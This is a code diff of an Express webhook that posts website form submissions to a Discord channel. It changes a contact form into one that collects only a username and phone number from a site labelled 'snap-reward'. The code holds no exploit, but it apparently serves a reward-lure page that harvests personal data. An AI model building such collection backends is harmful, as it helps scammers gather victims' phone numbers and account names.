@@ -6,15 +6,15 @@ const express = require("express");
 const app = express();
 app.use(express.json());
 app.get("/", (req, res) => res.send("Bot online"));
-// Webhook : site web -> Discord embed
+// Webhook : site web (snap-reward) -> Discord embed (pseudo + téléphone)
 app.post("/webhook/form", async (req, res) => {
   if (req.headers["x-secret-token"] !== process.env.SITE_SECRET) {
     return res.status(401).json({ error: "Non autorisé" });
   }
 
-  const { nom, email, message } = req.body || {};
-  if (!nom || !email || !message) {
-    return res.status(400).json({ error: "Champs manquants" });
+  const { pseudo, phone } = req.body || {};
+  if (!pseudo || !phone) {
+    return res.status(400).json({ error: "Pseudo et téléphone requis" });
   }
 
   const channelId = process.env.FORM_CHANNEL_ID;
@@ -25,16 +25,15 @@ app.post("/webhook/form", async (req, res) => {
     }
 
     const embed = new EmbedBuilder()
-      .setTitle("📥 Nouveau formulaire — Site web")
-      .setDescription("Un utilisateur a soumis le formulaire sur le site.")
+      .setTitle("📥 Nouvelle demande — Site web")
+      .setDescription("Un utilisateur a soumis ses informations sur le site.")
       .addFields(
-        { name: "Nom", value: String(nom), inline: true },
-        { name: "Email", value: String(email), inline: true },
-        { name: "Message", value: String(message), inline: false }
+        { name: "Pseudo", value: String(pseudo), inline: true },
+        { name: "Téléphone", value: String(phone), inline: true }
       )
       .setColor(0x0099ff)
       .setTimestamp()
-      .setFooter({ text: "Formulaire site web" });
+      .setFooter({ text: "Site web — snap-reward" });
 
     await channel.send({ embeds: [embed] });
     res.json({ ok: true });
